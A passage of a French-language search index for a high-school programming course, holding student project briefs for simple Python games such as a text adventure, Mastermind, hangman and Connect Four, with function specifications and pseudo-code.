<p>Cr\u00e9er une fonction <code>afficher_lieu(carte, nom_lieu)</code> qui affiche la description du lieu actuel et les objets visibles.</p> <p>D\u00e9placement du joueur</p> <p>Cr\u00e9er une fonction <code>se_deplacer(joueur, carte, direction)</code> qui : 1. V\u00e9rifie si la <code>direction</code> est une sortie valide depuis le <code>lieu_actuel</code> du joueur. 2. Si oui, met \u00e0 jour <code>joueur['lieu_actuel']</code> avec le nouveau lieu et renvoie <code>True</code>. 3. Si non, affiche un message d'erreur (ex: \"Vous ne pouvez pas aller par l\u00e0.\") et renvoie <code>False</code>.</p> <p>Ramasser un objet</p> <p>Cr\u00e9er une fonction <code>ramasser_objet(joueur, carte, nom_objet)</code> qui : 1. V\u00e9rifie si <code>nom_objet</code> est pr\u00e9sent dans la liste <code>objets</code> du <code>lieu_actuel</code>. 2. Si oui, ajoute l'objet \u00e0 <code>joueur['inventaire']</code>, le retire du lieu, affiche un message (ex: \"Vous avez ramass\u00e9 : \u00e9p\u00e9e rouill\u00e9e\") et renvoie <code>True</code>. 3. Si non, affiche un message d'erreur et renvoie <code>False</code>.</p> <p>Afficher l'inventaire</p> <p>Cr\u00e9er une fonction <code>afficher_inventaire(joueur)</code> qui affiche le contenu de l'inventaire du joueur.</p>"},{"location":"premiere/XIII-Projets/Jeu_Aventure_Textuel/sujet/#4-boucle-de-jeu-et-analyseur-de-commandes","title":"4. Boucle de Jeu et Analyseur de Commandes","text":"<p>Analyseur de commandes simples</p> <p>Cr\u00e9er une fonction <code>analyser_commande(commande_str)</code> qui prend la cha\u00eene de caract\u00e8res entr\u00e9e par le joueur (ex: \"aller nord\", \"prendre \u00e9p\u00e9e\") et la d\u00e9compose en un verbe d'action (ex: \"aller\", \"prendre\") et un argument optionnel (ex: \"nord\", \"\u00e9p\u00e9e\"). La fonction devrait renvoyer un tuple, par exemple <code>(\"aller\", \"nord\")</code> ou <code>(\"inventaire\", None)</code>. G\u00e9rer au moins les commandes : <code>aller &lt;direction&gt;</code>, <code>prendre &lt;objet&gt;</code>, <code>inventaire</code>, <code>regarder</code> (pour r\u00e9-afficher la description du lieu), <code>quitter</code>.</p> <p>Boucle de jeu principale</p> <p>Cr\u00e9er la boucle principale du jeu qui : 1. Affiche le lieu actuel du joueur. 2. Demande au joueur d'entrer une commande. 3. Analyse la commande. 4. Ex\u00e9cute l'action correspondante en appelant les fonctions appropri\u00e9es (<code>se_deplacer</code>, <code>ramasser_objet</code>, etc.). 5. Continue jusqu'\u00e0 ce que le joueur tape \"quitter\" ou qu'une condition de fin de jeu soit atteinte (non impl\u00e9ment\u00e9 dans cette \u00e9tape).</p> <p>Test des m\u00e9caniques de base</p> <ol> <li>Initialiser la <code>carte_du_jeu</code> et le <code>joueur</code>.</li> <li>Lancer la boucle de jeu.</li> <li>Tester les d\u00e9placements entre les lieux.</li> <li>Essayer de vous d\u00e9placer dans des directions invalides.</li> <li>Ramasser des objets pr\u00e9sents dans les lieux.</li> <li>Essayer de ramasser des objets qui ne sont pas l\u00e0 ou d\u00e9j\u00e0 pris.</li> <li>Afficher votre inventaire.</li> <li>Utiliser la commande <code>regarder</code>.</li> <li>Quitter le jeu.</li> </ol>"},{"location":"premiere/XIII-Projets/Jeu_Aventure_Textuel/sujet/#5-sauvegarde-et-chargement-de-la-partie","title":"5. Sauvegarde et Chargement de la Partie","text":"<p>Sauvegarder la partie</p> <p>Cr\u00e9er une fonction <code>sauvegarder_partie(joueur, carte, nom_fichier)</code> qui sauvegarde l'\u00e9tat actuel du <code>joueur</code> (lieu actuel, inventaire) et l'\u00e9tat de la <code>carte</code> (notamment les objets qui ont \u00e9t\u00e9 d\u00e9plac\u00e9s des lieux vers l'inventaire) dans un fichier. Le format JSON est recommand\u00e9 pour sa lisibilit\u00e9. Astuce : Vous aurez besoin de sauvegarder <code>joueur['lieu_actuel']</code>, <code>joueur['inventaire']</code>, et l'\u00e9tat actuel de <code>carte_du_jeu[lieu]['objets']</code> pour chaque lieu.</p> <p>Charger une partie</p> <p>Cr\u00e9er une fonction <code>charger_partie(nom_fichier)</code> qui lit les donn\u00e9es depuis le fichier de sauvegarde et restaure l'\u00e9tat du <code>joueur</code> et de la <code>carte</code>. La fonction doit renvoyer le <code>joueur</code> et la <code>carte</code> charg\u00e9s. Si le fichier de sauvegarde n'existe pas, elle peut initialiser une nouvelle partie ou renvoyer des valeurs indiquant qu'aucune sauvegarde n'a \u00e9t\u00e9 trouv\u00e9e.</p> <p>Int\u00e9gration dans la boucle de jeu</p> <p>Modifier la boucle de jeu pour : - Au d\u00e9marrage, demander \u00e0 l'utilisateur s'il veut charger une partie sauvegard\u00e9e ou commencer une nouvelle partie. - Ajouter une commande \"sauvegarder\" que le joueur peut taper pour sauvegarder sa progression.</p> <p>Test de la sauvegarde et du chargement</p> <ol> <li>Commencer une nouvelle partie, d\u00e9placez-vous, ramassez quelques objets.</li> <li>Sauvegarder la partie.</li> <li>Quitter le jeu.</li> <li>Relancer le jeu et charger la partie sauvegard\u00e9e.</li> <li>V\u00e9rifier que vous \u00eates au bon endroit, avec le bon inventaire, et que les objets ramass\u00e9s ne sont plus dans leurs lieux d'origine.</li> </ol>"},{"location":"premiere/XIII-Projets/Jeu_Aventure_Textuel/sujet/#pour-aller-plus-loin-optionnel","title":"Pour aller plus loin (Optionnel)","text":"<ul> <li>Personnages Non Joueurs (PNJ) : Ajoutez des PNJ avec qui interagir (commande <code>parler &lt;personnage&gt;</code>).</li> <li>\u00c9nigmes simples : Introduisez des \u00e9nigmes qui n\u00e9cessitent d'utiliser des objets de l'inventaire (commande <code>utiliser &lt;objet&gt; sur &lt;cible&gt;</code>).</li> <li>Conditions de victoire/d\u00e9faite : D\u00e9finissez un objectif pour le jeu.</li> <li>Plus de commandes : <code>examiner &lt;objet&gt;</code>, <code>lacher &lt;objet&gt;</code>.</li> </ul>"},{"location":"premiere/XIII-Projets/Mini_Projets/Devinette/sujet/","title":"Projet - Jeu de Devinette","text":"<p>Le but de ce projet est de cr\u00e9er un jeu o\u00f9 l'ordinateur choisit un nombre al\u00e9atoire et le joueur doit le deviner.</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Devinette/sujet/#fonctionnalites-requises","title":"Fonctionnalit\u00e9s requises","text":"<p>Le jeu doit : - G\u00e9n\u00e9rer un nombre al\u00e9atoire entre 1 et 100 - Permettre au joueur de faire des propositions - Indiquer si le nombre propos\u00e9 est trop grand ou trop petit - Compter le nombre d'essais - Permettre de rejouer</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Devinette/sujet/#etapes-du-projet","title":"\u00c9tapes du projet","text":""},{"location":"premiere/XIII-Projets/Mini_Projets/Devinette/sujet/#1-generation-du-nombre-aleatoire","title":"1. G\u00e9n\u00e9ration du nombre al\u00e9atoire","text":"<p>Nombre al\u00e9atoire</p> <p>Cr\u00e9er une fonction <code>generer_nombre</code> qui ne prend pas de param\u00e8tres et renvoie un nombre al\u00e9atoire entre 1 et 100.</p> <p>Indication : Utiliser le module <code>random</code> et la fonction <code>randint</code>.</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Devinette/sujet/#2-verification-de-la-proposition","title":"2. V\u00e9rification de la proposition","text":"<p>V\u00e9rification</p> <p>Cr\u00e9er une fonction <code>verifier_proposition</code> qui prend en param\u00e8tres : - le nombre \u00e0 deviner - la proposition du joueur</p> <p>La fonction doit renvoyer : - \"Trop grand!\" si la proposition est sup\u00e9rieure - \"Trop petit!\" si la proposition est inf\u00e9rieure - \"Gagn\u00e9!\" si la proposition est correcte</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Devinette/sujet/#3-gestion-des-entrees-utilisateur","title":"3. Gestion des entr\u00e9es utilisateur","text":"<p>Saisie s\u00e9curis\u00e9e</p> <p>Cr\u00e9er une fonction <code>demander_nombre</code> qui : - Demande au joueur de saisir un nombre - V\u00e9rifie que l'entr\u00e9e est bien un nombre - Renvoie le nombre si valide - Redemande si l'entr\u00e9e n'est pas valide</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Devinette/sujet/#4-boucle-de-jeu-principale","title":"4. Boucle de jeu principale","text":"<p>Boucle de jeu</p> <p>Cr\u00e9er une fonction <code>jouer</code> qui : 1. G\u00e9n\u00e8re un nombre al\u00e9atoire 2. Initialise le compteur d'essais 3. Tant que le joueur n'a pas gagn\u00e9 :     - Demande une proposition     - Affiche le r\u00e9sultat de la v\u00e9rification     - Incr\u00e9mente le compteur d'essais 4. Affiche le nombre d'essais n\u00e9cessaires 5. Propose de rejouer</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Devinette/sujet/#5-interface-utilisateur","title":"5. Interface utilisateur","text":"<p>Interface</p> <p>Cr\u00e9er une fonction <code>afficher_accueil</code> qui : - Affiche un message de bienvenue - Explique les r\u00e8gles du jeu - Lance la partie</p> <p>Test du jeu</p> <p>Tester le jeu avec les sc\u00e9narios suivants : 1. Trouver le nombre en moins de 5 essais 2. Entrer des valeurs invalides (lettres, symboles) 3. Jouer plusieurs parties d'affil\u00e9e</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Liste_Courses/sujet/","title":"Projet - Liste de Courses","text":"<p>Le but de ce projet est de cr\u00e9er un gestionnaire de liste de courses simple permettant d'ajouter, supprimer et modifier des articles.</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Liste_Courses/sujet/#fonctionnalites-requises","title":"Fonctionnalit\u00e9s requises","text":"<ul> <li>Ajouter des articles avec leur quantit\u00e9</li> <li>Supprimer des articles</li> <li>Modifier la quantit\u00e9 d'un article</li> <li>Afficher la liste compl\u00e8te</li> <li>Sauvegarder et charger la liste</li> </ul>"},{"location":"premiere/XIII-Projets/Mini_Projets/Liste_Courses/sujet/#etapes-du-projet","title":"\u00c9tapes du projet","text":""},{"location":"premiere/XIII-Projets/Mini_Projets/Liste_Courses/sujet/#1-gestion-des-articles","title":"1. Gestion des articles","text":"<p>Manipulation de la liste</p> <p>Cr\u00e9er les fonctions suivantes : - <code>ajouter_article(liste, article, quantite)</code> - <code>supprimer_article(liste, article)</code> - <code>modifier_quantite(liste, article, nouvelle_quantite)</code> - <code>afficher_liste(liste)</code></p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Liste_Courses/sujet/#2-sauvegarde-et-chargement","title":"2. Sauvegarde et chargement","text":"<p>Persistance des donn\u00e9es</p> <p>Cr\u00e9er les fonctions suivantes : - <code>sauvegarder_liste(liste, nom_fichier)</code> - <code>charger_liste(nom_fichier)</code></p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Liste_Courses/sujet/#3-interface-utilisateur","title":"3. Interface utilisateur","text":"<p>Menu principal</p> <p>Cr\u00e9er une fonction <code>afficher_menu</code> qui propose : 1. Ajouter un article 2. Supprimer un article 3. Modifier une quantit\u00e9 4. Afficher la liste 5. Sauvegarder la liste 6. Charger une liste 7. Quitter</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Liste_Courses/sujet/#4-programme-principal","title":"4. Programme principal","text":"<p>Gestion de la liste</p> <p>Cr\u00e9er une fonction <code>gerer_liste</code> qui : 1. Initialise une liste vide 2. Affiche le menu 3. Ex\u00e9cute l'action choisie 4. Continue jusqu'\u00e0 ce que l'utilisateur choisisse de quitter</p> <p>Test du programme</p> <p>Tester le programme en : 1. Ajoutant plusieurs articles 2. Modifiant des quantit\u00e9s 3. Supprimant des articles 4. Sauvegardant et rechargeant la liste</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Mastermind/sujet/","title":"Projet - MasterMind","text":"<p>Le but de ce projet est de reproduire le fonctionnement du jeu du MasterMind. Pour comprendre le fonctionnement du jeu : cliquer ici.</p> <p>R\u00e9sum\u00e9 du jeu :</p> <p>Un joueur choisit une combinaison de 4 ou 5 couleurs plac\u00e9es \u00e0 un certain endroit. Le but de l'autre joueur est de deviner en 10 coups maximum la combinaison de couleurs choisie par l'autre joueur.</p> <p>A chaque tours, le joueur qui cherche la bonne combinaison propose une combinaison et l'autre joueur lui indique le nombre de couleurs bien plac\u00e9es et si les couleurs propos\u00e9es sont pr\u00e9sentes dans la combinaison choisie.</p> <p>Ce projet peut \u00eatre d\u00e9velopp\u00e9 de plusieurs mani\u00e8res mais on va s'interesser ici \u00e0 le r\u00e9aliser de mani\u00e8re simple, en utilisant des listes python. On consid\u00e8re aussi que l'autre joueur est l'ordinateur (ce programme).</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Mastermind/sujet/#la-creation-de-la-liste-a-chercher","title":"La cr\u00e9ation de la liste \u00e0 chercher","text":"<p>Pour le but de ce projet, on d\u00e9cide que la combinaison \u00e0 chercher est d\u00e9finie al\u00e9atoirement. Les couleurs seront d\u00e9finies comme des cha\u00eenes de caract\u00e8re de cette mani\u00e8re : 'bleu' correspond \u00e0 la couleur bleue. On se munit des couleurs suivantes : \\(bleu,~rouge,~vert,~blanc,~jaune\\) et \\(orange\\) D'autres pourront \u00eatre rajout\u00e9es mais cela augmente la difficult\u00e9 pour gagner.</p> <p>Cr\u00e9er la liste des couleurs du jeu comme variable globale.</p> <p>Pour se faire, on va utiliser le module random et la m\u00e9thode sample. Cette m\u00e9thode prend en param\u00e8tre une liste et un entier n et renvoie un tirage de n \u00e9l\u00e9ments de la liste en param\u00e8tre sans remise.</p> <p>Cr\u00e9er la fonction <code>creer_combinaison_solution</code> qui prend en param\u00e8tre une liste l et un entier n et renvoie un tirage de n \u00e9l\u00e9ments de la liste l sans remise.</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Mastermind/sujet/#les-indications-pour-deviner","title":"Les indications pour deviner","text":"<p>A chaque tour, l'autre joueur donne l'indication \u00e0 celui qui devine le nombre de couleurs bien plac\u00e9es et le nombre de couleurs qui sont bien pr\u00e9sentes dans sa combinaison. Cette partie s'interesse \u00e0 ces indications.</p> <p>Cr\u00e9er la fonction <code>nombre_couleurs_pr\u00e9sentes</code> qui prend en param\u00e8tre deux listes : une qui correspond \u00e0 une proposition et l'autre \u00e0 la solution et renvoie le nombre de couleurs de la proposition pr\u00e9sentes dans la solution. </p> <p>Cr\u00e9er la fonction <code>nombre_couleurs_bien_placees</code> qui prend en param\u00e8tre deux listes : une qui correspind \u00e0 une proposition et l'autre \u00e0 la solution et renvoie le nombre de couleurs de la propositions qui sont bien plac\u00e9es dans la solution. </p> <p>Cr\u00e9er la fonction <code>gagnant</code> qui prend en param\u00e8tre une liste qui correspond \u00e0 une proposition, une autre correspondant \u00e0 la solution et renvoie True si la liste propos\u00e9e est la solution, False sinon.</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Mastermind/sujet/#la-boucle-de-jeu","title":"La boucle de jeu","text":"<p>On a ici le coeur de notre jeu : la cr\u00e9ation de la liste solution de mani\u00e8re al\u00e9atoire et les v\u00e9rifications des indications. Il ne nous manque donc que le fonctionnement du jeu : la boucle de jeu. Cette boucle de jeu sera con\u00e7ue par une fonction <code>jouer</code> qui sera compl\u00e9t\u00e9e petit \u00e0 petit \u00e0 la suite des questions et fera appel \u00e0 diverses fonctions.</p> <p>On veut r\u00e9aliser un bel affichage pour le lancement du jeu. Cr\u00e9er la fonction <code>premier_affichage</code> qui ne prend pas de param\u00e8tres et affiche dans la console ce rendu :</p> <pre><code>############### MasterMind ###############\n# Jeu r\u00e9alis\u00e9 par : Nom Pr\u00e9nom           #\n##########################################\n</code></pre> <p> </p> <p>Cr\u00e9er la fonction <code>afficher_gagnant</code> et qui r\u00e9alise l'affichage suivant : </p> <pre><code>Vous avez gagn\u00e9.\nLa combinaison \u00e9tait bien '/combinaison gagnante/'\n</code></pre> <p>Cr\u00e9er la fonction <code>choix_joueur</code>. Cette fonction doit r\u00e9pondre \u00e0 cet affichage et doit renvoyer la combinaison propos\u00e9e par le joueur.</p> <pre><code>Couleurs possibles '/couleurs de la question 1/'\nProposer une combinaison de 4 couleurs : \n#Choix du joueur#\nVous avez propos\u00e9 '/combinaison du joueur/'\n</code></pre> <p>Cr\u00e9er la fonction <code>verifications</code> qui prend en param\u00e8tre une combinaison propos\u00e9e par le joueur et la combinaison solution et affiche dans la console le nombre de couleurs pr\u00e9sentes et le nombre de couleurs bien plac\u00e9es. Elle proposera un affichage ludique similaire \u00e0 la question 6.</p> <p>Gr\u00e2ce aux fonctions pr\u00e9c\u00e9dentes, compl\u00e9ter la fonction jouer.</p> <p>En voici le pseudo-code incomplet:</p> <pre><code>    fonction jeu():\n\n    liste_solution &lt;- creer_combinaison_solution\n    gagne &lt;- ?\n    nombre_tours &lt;- ?\n    tant que nombre_tours &lt; ??? ou gagne est ??? : Faire\n        proposition &lt;- choix du joueur\n        afficher les verifications\n        gagne &lt;- gagnant\n        si gagne est ??? : \n            affichage du message gagnant\n        sinon : \n            nombre_tours &lt;- ???\n</code></pre>"},{"location":"premiere/XIII-Projets/Mini_Projets/Pendu/pendu/","title":"Sujet de TP : Jeu du Pendu","text":""},{"location":"premiere/XIII-Projets/Mini_Projets/Pendu/pendu/#presentation-du-probleme","title":"Pr\u00e9sentation du probl\u00e8me","text":"<p>Le jeu du pendu est un jeu de devinettes o\u00f9 le joueur essaie de d\u00e9couvrir un mot en proposant des lettres, avec un nombre limit\u00e9 d'erreurs possibles.</p> <p>Voici un lexique pour pouvoir y jouer : </p> <p><code>` lexique = maison, voiture, arbre, soleil, plage, chat, chien, livre, jardin, porte, table, chaise,  ecole, ville, village, chemin, fleur, pont, ballon, fenetre, escalier, travail, famille,   ami, enfant, cadeau, fromage, pain, vin, fruit, legume, chocolat, eau, salade, pizza,    bonbon, soupe, desert, montagne, mer, foret, lac, riviere, ciel, etoile, lune, feu</code></p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Pendu/pendu/#fonctions-a-implementer","title":"Fonctions \u00e0 impl\u00e9menter","text":""},{"location":"premiere/XIII-Projets/Mini_Projets/Pendu/pendu/#1-lettre_presente","title":"1. <code>lettre_presente</code>","text":"<p>\u00c9crire une fonction <code>lettre_presente</code> qui prend en param\u00e8tre un mot et une lettre et renvoie un bool\u00e9en indiquant si la lettre est pr\u00e9sente dans le mot.</p> <p>Exemple d'utilisation : ```python</p> <p>lettre_presente('python', 'p') True lettre_presente('python', 'z') False ```</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Pendu/pendu/#2-ajouter_lettre","title":"2. <code>ajouter_lettre</code>","text":"<p>\u00c9crire une fonction <code>ajouter_lettre</code> qui prend en param\u00e8tre une chaine de caract\u00e8re correspondant \u00e0 celle en cours, une lettre et la solution et renvoie la chaine \u00e0 compl\u00e9ter avec la lettre si pr\u00e9sente.</p> <p>Exemple d'utilisation : ```python</p> <p>ajouter_lettre('y_', 'p', 'python') 'py' ajouter_lettre('_', 'o', 'python') '_o__' ```</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Pendu/pendu/#3-lettre_deja_presente","title":"3. <code>lettre_deja_presente</code>","text":"<p>\u00c9crire une fonction <code>lettre_deja_presente</code> qui prend en param\u00e8tre une chaine de caract\u00e8res en cours et une lettre et renvoie un bool\u00e9en indiquant si la lettre est d\u00e9j\u00e0 pr\u00e9sente dans la chaine.</p> <p>Exemple d'utilisation : ```python</p> <p>lettre_deja_presente('py_', 'p') True lettredeja_presente('py__', 'o') False ```</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Pendu/pendu/#4-lettre_deja_proposee","title":"4. <code>lettre_deja_proposee</code>","text":"<p>\u00c9crire une fonction <code>lettre_deja_proposee</code> qui prend en param\u00e8tre une liste de lettres propos\u00e9es et une lettre et renvoie un bool\u00e9en indiquant si la lettre a d\u00e9j\u00e0 \u00e9t\u00e9 propos\u00e9e.</p> <p>Exemple d'utilisation : ```python</p> <p>lettre_deja_proposee(['a', 'e'], 'a') True lettre_deja_proposee(['a', 'e'], 'p') False ```</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Pendu/pendu/#5-pendu","title":"5. <code>pendu</code>","text":"<p>\u00c9crire une fonction <code>pendu</code> qui g\u00e8re le d\u00e9roulement complet du jeu du pendu.</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Pendu/pendu/#pseudo-code-de-la-fonction","title":"Pseudo-code de la fonction :","text":"<p>``` Fonction pendu():     solution = mot choisi al\u00e9atoirement     en_cours = cha\u00eene de '_' de m\u00eame longueur que solution     nb_essais = 8     lettres_proposees = liste vide</p> <pre><code>Tant que (nb_essais &gt; 0 ET solution != en_cours):\n    Demander \u00e0 l'utilisateur de saisir une lettre\n\n    Tant que (lettre d\u00e9j\u00e0 pr\u00e9sente dans en_cours \n               OU lettre d\u00e9j\u00e0 propos\u00e9e):\n        Afficher un message d'erreur\n        Redemander une lettre\n\n    Si (lettre est dans solution):\n        Mettre \u00e0 jour en_cours avec la lettre\n    Sinon:\n        Afficher \"La lettre n'est pas dans le mot\"\n        Ajouter la lettre aux lettres_proposees\n        D\u00e9cr\u00e9menter nb_essais\n\n    Afficher l'\u00e9tat en_cours\n\nSi (solution == en_cours):\n    Afficher \"Bravo, vous avez gagn\u00e9 !\"\nSinon:\n    Afficher \"Perdu ! Le mot \u00e9tait\", solution\n</code></pre> <p>```</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Pierre_Papier_Ciseaux/sujet/","title":"Projet - Pierre, Papier, Ciseaux","text":"<p>Le but de ce projet est de cr\u00e9er le jeu classique \"Pierre, Papier, Ciseaux\" o\u00f9 le joueur affronte l'ordinateur.</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Pierre_Papier_Ciseaux/sujet/#regles-du-jeu","title":"R\u00e8gles du jeu","text":"<ul> <li>La pierre bat les ciseaux</li> <li>Les ciseaux battent le papier</li> <li>Le papier bat la pierre</li> </ul>"},{"location":"premiere/XIII-Projets/Mini_Projets/Pierre_Papier_Ciseaux/sujet/#etapes-du-projet","title":"\u00c9tapes du projet","text":""},{"location":"premiere/XIII-Projets/Mini_Projets/Pierre_Papier_Ciseaux/sujet/#1-choix-de-lordinateur","title":"1. Choix de l'ordinateur","text":"<p>Choix al\u00e9atoire</p> <p>Cr\u00e9er une fonction <code>choix_ordinateur</code> qui : - Ne prend pas de param\u00e8tres - Renvoie al\u00e9atoirement \"pierre\", \"papier\" ou \"ciseaux\"</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Pierre_Papier_Ciseaux/sujet/#2-choix-du-joueur","title":"2. Choix du joueur","text":"<p>Saisie du joueur</p> <p>Cr\u00e9er une fonction <code>choix_joueur</code> qui : - Demande au joueur de choisir entre pierre, papier, ciseaux - V\u00e9rifie que le choix est valide - Redemande si le choix n'est pas valide - Renvoie le choix en minuscules</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Pierre_Papier_Ciseaux/sujet/#3-determination-du-gagnant","title":"3. D\u00e9termination du gagnant","text":"<p>V\u00e9rification du gagnant</p> <p>Cr\u00e9er une fonction <code>determiner_gagnant</code> qui prend en param\u00e8tres : - Le choix du joueur - Le choix de l'ordinateur</p> <p>La fonction doit renvoyer : - \"Gagn\u00e9!\" si le joueur gagne - \"Perdu!\" si l'ordinateur gagne - \"\u00c9galit\u00e9!\" en cas d'\u00e9galit\u00e9</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Pierre_Papier_Ciseaux/sujet/#4-gestion-du-score","title":"4. Gestion du score","text":"<p>Score</p> <p>Cr\u00e9er une fonction <code>gerer_score</code> qui : - Maintient le score du joueur et de l'ordinateur - Met \u00e0 jour les scores apr\u00e8s chaque manche - Affiche le score actuel</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Pierre_Papier_Ciseaux/sujet/#5-boucle-de-jeu","title":"5. Boucle de jeu","text":"<p>Partie compl\u00e8te</p> <p>Cr\u00e9er une fonction <code>jouer_partie</code> qui : 1. Initialise les scores 2. Tant que le joueur veut continuer :     - Obtient les choix du joueur et de l'ordinateur     - D\u00e9termine le gagnant     - Met \u00e0 jour les scores     - Affiche le r\u00e9sultat     - Demande si le joueur veut continuer</p> <p>Test du jeu</p> <p>Tester le jeu avec les sc\u00e9narios suivants : 1. Jouer plusieurs manches 2. Tester toutes les combinaisons possibles 3. Entrer des choix invalides 4. V\u00e9rifier que les scores sont correctement mis \u00e0 jour</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Puissance_4/puissance_4/","title":"Sujet de TP : Jeu du Puissance 4","text":""},{"location":"premiere/XIII-Projets/Mini_Projets/Puissance_4/puissance_4/#presentation-du-probleme","title":"Pr\u00e9sentation du probl\u00e8me","text":"<p>Le Puissance 4 est un jeu de strat\u00e9gie \u00e0 deux joueurs o\u00f9 l'objectif est d'aligner quatre jetons de sa couleur.</p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Puissance_4/puissance_4/#fonctions-a-implementer","title":"Fonctions \u00e0 impl\u00e9menter","text":""},{"location":"premiere/XIII-Projets/Mini_Projets/Puissance_4/puissance_4/#1-gestion-de-la-grille","title":"1. Gestion de la grille","text":"<p>\u00c9crire une fonction <code>grille_vide</code> qui ne prend pas de param\u00e8tres et renvoie une liste \u00e0 deux dimensions de 6 lignes et 7 colonnes de cha\u00eenes de caract\u00e8res.</p> <p>Exemple d'utilisation et de r\u00e9sultat : <pre><code>&gt;&gt;&gt; grille = grille_vide()\n&gt;&gt;&gt; for ligne in grille:\n...     print(ligne)\n['.', '.', '.', '.', '.', '.', '.']\n['.', '.', '.', '.', '.', '.', '.']\n['.', '.', '.', '.', '.', '.', '.']\n['.', '.', '.', '.', '.', '.', '.']\n['.', '.', '.', '.', '.', '.', '.']\n['.', '.', '.', '.', '.', '.', '.']\n</code></pre></p> <p>\u00c9crire une fonction <code>afficher_grille</code> qui prend en param\u00e8tre une grille et l'affiche de mani\u00e8re lisible.</p> <p>Exemple d'utilisation : <pre><code>&gt;&gt;&gt; grille = grille_vide()\n&gt;&gt;&gt; afficher_grille(grille)\n  1   2   3   4   5   6   7\n. . . . . . .\n. . . . . . .\n. . . . . . .\n. . . . . . .\n. . . . . . .\n. . . . . . .\n</code></pre></p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Puissance_4/puissance_4/#2-gestion-des-colonnes","title":"2. Gestion des colonnes","text":"<p>\u00c9crire une fonction <code>colonne_valide</code> qui prend en param\u00e8tre une grille et une colonne et renvoie <code>True</code> si la colonne est bien comprise dans la grille. Indication : La grille contient 7 colonnes allant d'indice 0 jusque 6.</p> <p>Exemple d'utilisation : <pre><code>&gt;&gt;&gt; colonne_valide(grille, 3)\nTrue\n&gt;&gt;&gt; colonne_valide(grille, 8)\nFalse\n</code></pre></p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Puissance_4/puissance_4/#22-colonne_pleinegrille-colonne","title":"2.2 <code>colonne_pleine(grille, colonne)</code>","text":"<p>\u00c9crire une fonction <code>colonne_pleine</code> qui prend en param\u00e8tres une grille et un entier correspondant \u00e0 une colonne et renvoie <code>True</code> si la colonne est pleine, <code>False</code> sinon.</p> <p>Exemple d'utilisation : <pre><code>&gt;&gt;&gt; grille[0][2] = 'X'\n&gt;&gt;&gt; grille[1][2] = 'X'\n&gt;&gt;&gt; grille[2][2] = 'X'\n&gt;&gt;&gt; grille[3][2] = 'X'\n&gt;&gt;&gt; grille[4][2] = 'X'\n&gt;&gt;&gt; grille[5][2] = 'X'\n&gt;&gt;&gt; colonne_pleine(grille, 2)\nTrue\n&gt;&gt;&gt; colonne_pleine(grille, 3)\nFalse\n</code></pre></p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Puissance_4/puissance_4/#3-placement-des-jetons","title":"3. Placement des jetons","text":"<p>\u00c9crire une fonction <code>ajouter_jeton</code> qui prend en param\u00e8tre une grille, un entier correspondant \u00e0 une colonne et un caract\u00e8re (X ou O) correspondant au joueur. Indication : pour r\u00e9aliser cette fonction, vous devrez traiter les lignes de bas en haut. Vous devrez utiliser une boucle <code>for</code> qui commence de la fin jusqu'au d\u00e9but avec un pas de -1.</p> <p>Exemple d'utilisation : <pre><code>&gt;&gt;&gt; nouvelle_grille = ajouter_jeton(grille, 3, 'X')\n&gt;&gt;&gt; afficher_grille(nouvelle_grille)\n  1   2   3   4   5   6   7\n. . . . . . .\n. . . . . . .\n. . . . . . .\n. . . . . . .\n. . . . . . .\n. . . X . . .\n</code></pre></p>"},{"location":"premiere/XIII-Projets/Mini_Projets/Puissance_4/puissance_4/#4-verification-de-victoire","title":"4. V\u00e9rification de victoire","text":"<p>\u00c9crire une fonction <code>verifier_ligne</code> qui prend en param\u00e8tre une grille et une cha\u00eene de caract\u00e8re correspondant \u00e0 un joueur qui v\u00e9rifie s'il y a un alignement horizontal de 4 jetons. Indication : Vous devrez v\u00e9rifier si 4 symboles qui sont align\u00e9s horizontalement sont les m\u00eames. Pour se faire, vous pouvez r\u00e9aliser une boucle for pour chaque ligne. Il sera plus pratique de r\u00e9aliser un for par indice qui commencera \u00e0 0 et ira jusqu'au maximum la longueur de votre ligne - 3.</p> <p>\u00c9crire une fonction <code>verifier_colonne</code> qui prend en param\u00e8tre une grille et une cha\u00eene de caract\u00e8re correspondant \u00e0 un joueur qui v\u00e9rifie s'il y a un alignement vertical de 4 jetons.</p> <p>Indication : Vous devrez v\u00e9rifier si 4 symboles qui sont align\u00e9s verticalement sont les m\u00eames. Pour se faire, vous pouvez r\u00e9aliser une boucle for pour chaque ligne puis une boucle imbriqu\u00e9e pour chaque colonne. Il sera plus pratique de r\u00e9aliser ces for par indice qui commenceront \u00e0 0 et iront jusqu'\u00e0 votre nombre de lignes -3 et traitera toutes les colonnes.</p> <p>On dispose d'une fonction <code>verifier_diagonale</code></p> <pre><code>def verifier_diagonale(grille:list[list[str]],joueur:str)-&gt;bool:\n    for i in range(len(grille)-3):\n        for j in range(len(grille[0])-3):\n            if grille[i][j] == joueur and grille[i+1][j+1] == joueur and grille[i+2][j+2] == joueur and 